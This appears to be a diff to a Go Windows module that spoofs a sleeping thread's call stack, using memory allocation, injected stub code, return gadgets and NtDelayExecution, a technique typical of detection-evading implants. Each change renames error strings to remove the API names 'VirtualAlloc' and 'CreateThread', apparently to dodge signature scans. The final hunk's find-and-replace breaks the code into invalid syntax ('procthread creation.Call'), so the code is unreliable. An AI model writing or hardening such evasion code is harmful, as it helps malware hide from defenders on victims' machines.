@@ -112,7 +112,7 @@ func (s *stackSpoofState) init() error {
 	if err != nil {
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("VirtualAlloc data: %w", err)
+		return fmt.Errorf("memory alloc data: %w", err)
 	}
 	s.dataAddr = dataAddr
 
@@ -124,7 +124,7 @@ func (s *stackSpoofState) init() error {
 		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("VirtualAlloc spoof stack: %w", err)
+		return fmt.Errorf("memory alloc stack: %w", err)
 	}
 	s.spoofStackAddr = spoofStack
 
@@ -155,7 +155,7 @@ func (s *stackSpoofState) init() error {
 		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("VirtualAlloc stub: %w", err)
+		return fmt.Errorf("memory alloc stub: %w", err)
 	}
 	// Copy stub code
 	stubSlice := unsafe.Slice((*byte)(unsafe.Pointer(stubAddr)), len(stub))
@@ -189,7 +189,7 @@ func (s *stackSpoofState) init() error {
 		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("CreateThread: %w", err)
+		return fmt.Errorf("thread creation: %w", err)
 	}
 
 	s.threadHandle = hThread
@@ -316,7 +316,7 @@ func findRetGadget(addr uintptr, skip, maxScan int) uintptr {
 // generateSleepStub generates x86-64 machine code for the dedicated sleep thread.
 // The stub loops: wait for signal → spoof stack → NtDelayExecution → restore → signal done.
 //
-// RCX (first param from CreateThread) = pointer to data block.
+// RCX (first param from thread creation) = pointer to data block.
 // The data block is mutable RW memory with event handles, gadget addresses, and timing.
 func generateSleepStub() []byte {
 	var code []byte
@@ -400,7 +400,7 @@ func generateSleepStub() []byte {
 // createNativeThread creates a Windows thread outside Go's runtime, starting
 // at stubAddr with dataAddr as the parameter. Thread is created suspended.
 func createNativeThread(stubAddr, dataAddr uintptr, threadID *uint32) (windows.Handle, error) {
-	h, _, err := procCreateThread.Call(
+	h, _, err := procthread creation.Call(
 		0,        // security attributes
 		0,        // default stack size
 		stubAddr, // start address
